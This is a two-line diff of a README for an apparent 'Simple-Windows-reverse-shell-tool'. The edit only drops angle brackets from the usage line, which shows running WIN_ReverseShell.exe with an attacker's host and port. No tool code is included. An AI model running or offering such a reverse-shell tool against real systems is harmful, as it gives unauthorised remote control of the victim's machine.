@@ -1,2 +1,2 @@
 # Simple-Windows-reverse-shell-tool
-Execution method: WIN_ReverseShell.exe <LHOST> <LPORT>
+Execution method: WIN_ReverseShell.exe LHOST LPORT
